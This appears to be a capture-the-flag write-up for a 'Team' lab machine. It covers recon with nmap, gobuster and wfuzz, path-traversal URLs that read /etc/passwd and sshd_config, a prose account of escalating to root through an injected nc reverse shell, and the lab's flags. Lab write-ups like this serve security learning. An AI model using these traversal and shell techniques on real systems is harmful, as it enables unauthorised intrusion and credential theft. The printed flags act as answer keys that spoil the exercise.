Team.doc
---------------

name : Eviyatar Cohen

Date : 19.10.2022

IP=10.10.56.36
-------------------------------------

Nmap Results:
==============
nmap -sC -sV 10.10.56.36     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-19 01:32 EDT
Nmap scan report for 10.10.56.36
Host is up (0.089s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.27 seconds
---------------------------------------------------------------

GoBuster Results:
--------------------
gobuster dir -u http://team.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/19 01:42:19 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
Progress: 35 / 1273835 (0.00%)                                             Progress: 95 / 1273835 (0.01%)                                             Progress: 145 / 1273835 (0.01%)                                            Progress: 205 / 1273835 (0.02%)                                            Progress: 265 / 1273835 (0.02%)                                            /scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/] 

----------------------------------------------------------------

Potential Users:
=================
dale:

Run GoBuster Again With /scripts:
---------------------------------
Found in scan a directory script.txt and its content:
=====================================================
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
----------------------------------------------------------------

Leave This For now i Checked if there is any SubDomains:
---------------------------------------------------------
wfuzz -c --hw 977 -u http://team.thm -H "Host: FUZZ.team.thm" -w ~/Desktop/git/SecLists/Discovery/DNS/subdomains-top1mil
lion-5000.txt

---------------------------------------------------------------

Wfuzz Results:
================
wfuzz -c --hw 977 -u http://team.thm -H "Host: FUZZ.team.thm" -w ~/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://team.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload   
=====================================================================

000000001:   200        89 L     220 W      2966 Ch     "www"     
000000019:   200        9 L      20 W       187 Ch      "dev"     
000000085:   200        9 L      20 W       187 Ch      "www.dev" 
000000689:   400        12 L     53 W       422 Ch      "gc._msdcs

---------------------------------------------------------------

I Added www.dev to /etc/hosts :
-------------------------------

Inside Was This Link Which Allow Me To Navigate In The System:
===============================================================
http://dev.team.thm/script.php?page=/../../../../../../etc/passwd

---------------------------------------------------------------

Now After Some Thime And Nevigate In The System I Found The ID_RSA Key For dale:
===============================================================
PATH:
=====
http://dev.team.thm/script.php?page=/../../../../../../etc/ssh/sshd_config

---------------------------------------------------------------

Login SSH with The User and The id_rsa Key Found!!
---------------------------------------------------

User Flag : THM{6Y0TXHz7c2d}

Now Lets Find The Root Flag:
============================

To find the root flag i Used the admin_checks script to switch user go gyle and then i used the main_backup.sh script to inject the nc caller to me with root shell!!

Root Flag : THM{fhqbznavfonq}

---------------------------------------------------------------
